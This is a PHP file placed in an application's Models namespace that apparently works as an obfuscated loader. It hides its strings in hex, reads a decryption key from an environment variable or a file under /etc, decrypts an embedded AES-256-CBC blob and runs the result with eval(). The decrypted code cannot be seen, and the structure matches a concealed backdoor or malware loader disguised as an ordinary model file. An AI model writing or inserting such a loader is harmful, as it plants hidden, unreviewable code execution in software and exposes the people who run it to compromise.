<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AVB3CHP8l/hybmn3TYXb1w==');

$c=base64_decode(

'PDfLKRRQA1SbsLu2wAU7xn70LEZHdgMWbSC70UU/pwR3skMRuMxU5tPNASZ+Nq95LTr/lYWbDVJN' .
'qq9E3OjPbGy39w60Jo7X19H2hTZszkuFLVIo2A3Xc63ODYWKRZVotPk8xNj8BAYhw0p9gkcupMqf' .
'yvWTxLZ5mzNk1uj91KxG9XTjLLv0KZR2Rb/qKGUtqEuK9mLiv+hDYNvfsPjvd6tWJB7o7uy9M6NS' .
'cOVMsh60wiqjTkqWzWerCEcOD5Zkurl4YJgoDZ791hb82Cb9gzy+REgU+03kb0ictOb4bgRPAfrB' .
'HUteJk3p0RLiHjneYNTZKemzTDesHxG2e2fZywhUTp23IYfghL8VUzo2MxLSjO57Gu4vHfS67gvh' .
'YtzJih5KY1fsteC3S4lV25YNFtucQ97KDVC3q3mtbCbEm1Rzt0d5nq9I+MGvctxMVzFsg20J25gY' .
'QmPwlbpVhBHJnd+ISbAlkbvB6r7/oqfX2e8fWfBGkq/81FdCgU5unQSlyJu2ReXVEnIybAq5RGrI' .
'JOvWxcmH+WUKwSE4e+A9t8irlBfyea5Ul4ZMGbW9Edy+Da/vsfLoZ9nBBXg3PO289ffc6Sa4Ajy+' .
'kvAhT71jKnof8Q3ALpwmqAtUtGxk7KNH+28cRuELxg7/3nmjnpzVrT+4zFkAY2sk+7eJ7J17bW1B' .
'K3gcVBpdrwZaULeNJUsCZkNWcPz2a6eWRTA+A3xypIWeUSSrV5yfF86QoABq+QMd3pSLibLZucYf' .
'ZxEzksb5xlDLsL3L3bcqE7Qdu9nTuggpF2iwp4gevSixqc5ZtewcKG1oSyaKEGUXabFPaGFgIXe6' .
'EJv6jEkqI13RV4dAKHbsrD20BoIyOzB2RkD2nvlWEnXJesCOOwwWTJ2Pr+1i'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

